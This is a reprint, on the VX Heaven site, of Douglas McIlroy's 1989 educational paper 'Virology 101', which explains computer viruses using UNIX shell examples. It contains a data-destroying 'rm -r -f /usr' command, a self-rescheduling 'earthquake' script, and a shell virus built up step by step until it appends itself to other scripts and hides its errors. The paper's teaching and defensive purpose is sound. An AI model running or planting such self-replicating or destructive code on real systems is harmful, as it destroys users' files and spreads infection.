<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>Douglas McIlroy 'Virology 101' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Douglas McIlroy"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, McIlroy, Douglas,Virology 101, tryme, earthquake, program, system, make, traductor, script, security, programming, language, virus, infect, unix, consequence, computer"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"87dca81ecefc24d3e3ca625a796cc8252cc9b64d-1498757431-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vmm00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Virology 101</h1><p><a href="/lib/?lang=en&amp;author=McIlroy%2C%20Douglas">Douglas McIlroy</a><br/> <em>Computing Systems, 1989, v.2, N 2, pp. 173-181</em><br/> <em>ISSN 0895-6340</em><br/> <em> 1989</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vmm00.html';</script><div class="ci"><a href="/lib/?ci=vmm00">3</a></div><img src="/img/pdf.gif" alt="PDF"/><a href="/lib/pdf/Virology%20101.pdf">Download</a> PDF (20.74Kb) (You need to be registered on <a href="/forum">forum</a>)<br/>[<a style="" href="/lib/?lang=EN&amp;index=MA#vmm00">Back to index</a>] [<a href="/lib/vmm00.html#disqus_thread">Comments</a>]<br/> 
<p><em>Bell Laboratories Murray Hill, New Jersey 07974</em></p>
<ul>
<li><a href="#p1">Abstract</a></li>
<li><a href="#p2">A realistic specimen</a></li>
<li><a href="#p3">Lessons</a></li>
<li><a href="#p4">References</a></li>
</ul>
<h2><a name="p1">Abstract</a></h2>
<p>There is nothing mysterious about computer viruses. A working, but easily observable, virus can be written in a few lines of code. Although particular virus attacks may be guarded against, no general defense within one domain of reference is possible; viruses are a natural consequence of stored-program computation. Like other hazards of technology, their threat may be mitigated by cautious behavior and community sanctions.</p>
<p>The principle I intend to demonstrate a simple, yet realistic, computer virus for people who may be curious but who havenot been motivated to dabble in this shady field. Nothing here will edify folks bent on mischief. The example is made for clarity; it makes no malign effort to hide in obscure recesses of a computer system. Ithas been expressed in a highly accessible language the shell language of UNIX(R) systems. Thus it may beunderstood without resort to "microscope and tweezers." <a href="#L3">[3]</a> For good cause, it has not been tested.</p>
<p>Ostensibly as a public service, but probably more to establish priestly mystery, writers about viruses usu-ally omit the details. One claimed, "Most computer programmers, aside from virus researchers, have... difficulty in writing the code to make a virus replicate itself and secure itself to another disk." <a href="#L4">[4]</a> Despitethe claim, programs that reproduce themselves are not hard to make <a href="#L9">[9]</a>. Indeed, like M. Jourdain, who was astonished to learn he'd been speaking prose all his life <a href="#L6">[6]</a>, programmers make or use them unconsciously in everyday work.</p>
<p>Not only can almost anybody make a self-reproducing program <a href="#L1">[1]</a>, almost everybody already has one: just turn a file-copy program on itself. As soon as you can program a computer to do anything repeatedly and that is the real reason for having acomputer at all you can make it do something bad repeatedly. The file removal command can cause an earthquake in UNIX systems. The one-liner,</p>
<pre class="source">
rm -r -f /usr
</pre>
<p>says, "Recursively (-r), and without bothering me with diagnostics (-f), remove all the files you can fromusers' directories." One more line of code will cause an unending swarm of earthquakes. Place in the file earthquake (in a write-protected directory),</p>
<pre class="source">
rm -r -f /usr
at 0200 sunday earthquake
</pre>
<p>Submit it for execution at 2AM next Sunday:</p>
<pre class="source">
at 0200 sunday earthquake 
</pre>
<p>After the earthquake happens, another will be scheduled for the following week, and so on. The program will reproduce itself even across computer outages.</p>
<p>Both rm and at are eminently useful programs. The fact that they might be used for nefarious purposesdoes not deter us from providing them to computer users any more than does the incendiary nature of gasoline keep us from selling it to motorists.</p>
<p>All the cleverness of the earthquake program lies in the second line; the first line is mere malice. Thus asingle line of code is all it takes to make a self-perpetuating program. Perhaps, though, the earthquake is unfair: the at utility upon which it depends seems to have been specially tailored for the purpose. A thor-oughly realistic example should be made of more ordinary materials.</p>
<p>Here's an ancestral model. Too clumsy to get very far undetected, it nevertheless contains the same nuggetused by all its more sophisticated descendants, which differ only in degrees of caution and aggressiveness. The virus is a shell script, which lives in file /tryme. Its entire text is</p>
<pre class="source">
cp /tryme $1
</pre>
<p>Suppose a gullible snooper tries to find out what /tryme does, giving it a random argument for good measure:</p>
<pre class="source">
/tryme sure
</pre>
<p>Lo and behold, a new file sure appears, containing another copy of the same shell script,</p>
<pre class="source">
cp /tryme $1
</pre>
<p>The program has reproduced itself, and it will reproduce itself again as soon as somebody executes sure. This tiny critter has its drawbacks. If the argument names an existing writable file, that file will be wipedout and replaced by the virus a brutal attack that will not go unnoticed for long. If the argument names a new file, its unexpected creation could be a tip-off. If our curious gull simply types /tryme the virus willreveal itself instantly through a diagnostic:</p>
<pre>
Usage: cp f1 f2; or cp f1 ... fn d2
</pre>
<p>Finally, no matter how badly the system is infected, the epidemic can be stopped simply by removing /tryme. The virus is both too lethal to its prey and too delicate itself to propagate far, if at all. Still, itembodies the basic plot: make a file that will copy itself somewhere else. All we need to add is a little finesse.</p>
<h2><a name="p2">A realistic specimen</a></h2>
<p>It might be argued that earthquake and tryme are not viruses at all because they are programs in theirown right, while a virus should live inside another program. The distinction is largely in the mind of the beholder. Step back a little and you will see a computer system as one large program working in one largememory the entire file system. Most systems contain copy programs or backup dump programs that can copy themselves or even the whole system to a tape, another disc, or another computer. From this stand-point we can identify as viruses some important components of perfectly healthy systems. Nevertheless, I shall proceed to elaborate the program into one that will be recognized as a virus by any definition. We can take the copy from the current program rather than from a fixed place. Now the virus will carry itsown genetic recipe; the contagion will persist until the last copy is eliminated.</p>
<pre class="source">
#!/bin/sh
cp $0 $1
</pre>
<p>The cryptic first line (#!/bin/sh) identifies the program as a shell script. Suppose the script lives in file /bin/traductor, and is normally invoked by typing traductor. Parameter $0 becomes the realname of the program, /bin/traductor.<sup>*</sup> Thus the command traductor firsttarget finally executes</p>
<pre class="source">
cp /bin/traductor firsttarget 
</pre>
<p><em>(*) This is why the script begins with #!/bin/sh. Without that indicator, parameter $0 would merely be the name under which the script was invoked, namely traductor, which may be insufficient to locate the file for copying.</em></p>
<p>Now firsttarget contains the virus, too. When it is invoked, say in the form firsttarget secondtarget, it will be executed as</p>
<pre class="source">
cp firsttarget secondtarget
</pre>
<p>The virus will replicate regardless of what has become of the original in /bin/traductor.</p>
<p>We can test the target to ensure that the only files to be hit are executable (-x); it was unnecessarily roughto infect anything else. New code is shown in <strong>bold</strong> type.</p>
<pre class="source">
#!/bin/sh
<strong>if test t -x "$1"
then</strong> cp $0 $1
<strong>fi</strong>
</pre>
<p>We can look around the current directory for prey, not depending on the gull to supply it. In so doing wealso cause the infection to spread to several victims ($i) at a time.</p>
<pre class="source">
#!/bin/sh
<strong>for i in *
do</strong>	if test -x <strong>"$i"</strong>
	then cp $0 <strong>$i</strong>
	fi
<strong>done</strong>
</pre>
<p>WARNING: THE BUG IS GETTING NASTIER. STUDY IT, BUT DON'T TRY IT. You may lose friends. And you maynever recover. Suppose a copy makes its way onto a backup disc.</p>
<p>Yet more selectively, we can choose to infect only files that identify themselves as shell scripts with a tell-tale #!/bin/sh in the first line.</p>
<pre class="source">
#!/bin/sh
for i in * 
do	<strong>case "`sed 1q $i`" in
	"#!/bin/sh")</strong> cp $0 $i
	<strong>esac</strong>
done
</pre>
<p>The stream editor, sed, delivers one line from the target file and quits (1q); the technical baggage ofquotes may be ignored.</p>
<p>The virus still wantonly overwrites each file it attacks. The attack may be sharpened by appending toscripts rather than replacing them. Now infected programs will do what they were originally supposed to do plus a bit more. The virus becomes a stowaway rather than a crude imposter.</p>
<pre class="source">
for i in * <strong>#virus#</strong>
do	case "`sed 1q $i`" in
	"#!/bin/sh") <strong>sed -n '/#virus#/,$p'</strong> $0 >> $i
	esac
done
</pre>
<p>The work is all done in the second sed command, which says scan without printing (-n) the file itself($0); print (p) from the line marked with the comment #virus# through to the end ($); and append (>>) the result to the target ($i). The initial #!/bin/sh has disappeared. It is no longer part of the virusproper, as it is not copied when the virus reproduces.</p>
<p>To keep infected files from growing exponentially, it's a good idea to prevent reinfection of alreadyinfected code.</p>
<pre class="source">
for i in * #virus#
do	case "`sed 1q $i`" in
	"#!/bin/sh") <strong>grep '#virus#' $i > /dev/null ||</strong>
	sed -n '/#virus#/,$p' $0 >>$i
	esac
done
</pre>
<p>The guarding grep command searches for any #virus# line in the target. The output is redirected (>) toa rathole (/dev/null). When grep fails to find anything, a new victim has been located and the sedcommand is activated conditionally (||).</p>
<p>Finally, we can discard any diagnostics that appear on the standard error stream (2>/dev/null), so thevirus will be silent when things go wrong.</p>
<pre class="source">
for i in * #virus#
do	case "`sed 1q $i`" in
	"#!/bin/sh") grep '#virus#' $i >/dev/null || 
	sed -n '/#virus#/,$p' $0 >>$i
	esac
done <strong>2> /dev/null</strong>
</pre>
<p>As variations on the theme, we might try to fork the virus into the background in order to conceal the timeit takes, or try to overwhelm defenses by forking aggressively inside the loop.</p>
<h2><a name="p3">Lessons</a></h2>
<p>Shell viruses are remarkably simple. If we give tryme a one-letter name, it fits in eight bytes. The fanci-est version, small enough to merit the name <em>Traductor simplicimus</em>, easily fits in 150 bytes.</p>
<p><em>Simplicimus</em> needs a vector, namely a computer user, and only makes limited forays of its own (for i in *). A vector, however, can carry it to another machine that has the same operating system and shell. Agri-culturalists know the phenomenon: epidemics spread readily in monocultures. Standardization has its risks.</p>
<p>A vector isn't necessary. Anything that one can tell a machine to do manually can be automated. It is nogreat leap from <em>simplicimus's</em> simple search around one directory to a search further afield other directories, other disks, or other machines. And, as in the earthquake example, it is an equally small step to a real <em>Traductor pugnax</em> that activates new copies of itself without human intervention.</p>
<p>The present exercise, which was distilled from programs by Tom Duff, adds force to the title of a technicalreport by <em>Jim Reeds, /bin/sh: The biggest UNIX security loophole</em>, but with a mordant twist <a href="#L2">[2]</a>, <a href="#L7">[7].</a> The possibility of shell viruses arises not from special properties of the UNIX system or its shell commandlanguage, but from the mere fact that the shell and the file system behave as processor and memory of a stored program computer. Viruses are a corollary of universality.</p>
<p>To put it another way, if you have a programmable computer with a file system inhabited by both programsand data, you can make viruses. It doesn't matter what hardware or operating system you are using. Nobody can stop you.</p>
<p>It is often possible, however, to prevent a virus created at one level of programming from infecting anotherlevel. If you have no way to modify the firmware of your machine from the programming level, the firmware is safe at least from programmers. Similarly, if the only programs you can write are for aninterpreter that lives in files inaccessible from any interpreted program, then you can't infect the interpreter. Likewise, user programs can't infect system code that boots from a read-only device and has its own address space. For example, the operating system kernel is immune to <em>Traductor</em>, which attacks the wronglanguage in the wrong address space to cause any harm to the kernel. By contrast, the extreme malignity of some PC viruses owes in no small part to the complete absence of level distinctions in the architecture; nopart of the system is safe from any machine-language program.</p>
<p>Bryan Kocher wisely observed that epidemics are best averted by paying assiduous attention to public health <a href="#L5">[5]</a>. A sensationalist press even the respected scientific press often oversells "vaccines" andother countermeasures as panaceas <a href="#L8">[8]</a>. Some of these products guard against particular attacks, usually by noticing when particular programs, especially operating system bootstraps, change. Some watch for subtlerchanges. But as long as a system is not absolutely static and any programs can change, it will be open to attack <a href="#L9">[9]</a>. No fixed set of hygienic measures can provide lasting immunity. Continuing attention is crucial.</p>
<p>Hygiene pays off. AT&amp;T resisted the great Internet virus of November 2, 1988 <a href="#L3">[3]</a>, by "good housekeeping and good luck," in the words of Fred Grampp. Good housekeeping, because the keepers of the corporate network gateway, especially Dave Presotto, refused to run the tortuous software that the virusexploited. Good luck, because some AT&amp;T computers did run that software, but, thanks to the gateway, were not exposed directly to the Internet.</p>
<p>Computer viruses are aptly named. They are a consequence of programming as disease is a consequence ofliving. Higher forms of programming, like higher forms of life, are subject to more forms of disease. So it is with shells. In a rich environment of software tools, a shell becomes a programming language of remarkable power. Ultimately the ends to which that power may be turned will be determined by community norms and sanctions.</p>
<h2><a name="p4">References</a></h2>
<ol>
<li><a name="L1"></a>Dewdney, A. K. <a href="/lib/mad01.html">Computer recreations</a>. Scientific American 250, 5 (May, 1984), 15-19.</li>
<li><a name="L2"></a>Duff, T. D. S. <a href="/lib/vtd01.html">Viral attacks on UNIX system security</a>. In Proceedings of the Winter 1989 Usenix conference, Usenix Association, Berkeley, January, 1989.</li>
<li><a name="L3"></a>Eichen, M. and Rochlis, J. <a href="/lib/aem02.html">With microscope and tweezers: an analysis of the Internet virus of November 1988</a>. Massachusetts Institute of Technology, 1988.</li>
<li><a name="L4"></a>Highland, H. J. Random bits and bytes. Computers and Security 7 (1988), 337-346.</li>
<li><a name="L5"></a>Kocher, B. <a href="/lib/abk00.html">A hygiene lesson</a>. CACM 32 (1989), 3,6.</li>
<li><a name="L6"></a>Moliere Le Bourgeois Gentilhomme. Act II, Scene 4, Paris, 1670.</li>
<li><a name="L7"></a>Reeds, J. A. /bin/sh: The biggest UNIX(TM) security loophole. AT&amp;T Bell Laboratories, Murray Hill,NJ, 1984.</li>
<li><a name="L8"></a>Shulman, S. `Virus-proof' computer security system. Nature 337 (5 January, 1989), 4.</li>
<li><a name="L9"></a>Thompson, K. <a href="/lib/mkt00.html">Reflections on trusting trust</a>. CACM 27 (1984), 761-764.</li>
</ol>
[<a style="" href="/lib/?lang=EN&amp;index=MA#vmm00">Back to index</a>] [<a href="/lib/vmm00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vmm00">de</a><a href="/lib/index.php?lang=en&amp;id=vmm00">en</a><a href="/lib/index.php?lang=es&amp;id=vmm00">es</a><a href="/lib/index.php?lang=it&amp;id=vmm00">it</a><a href="/lib/index.php?lang=fr&amp;id=vmm00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vmm00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vmm00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vmm00">ua</a></div>
</body>
</html>
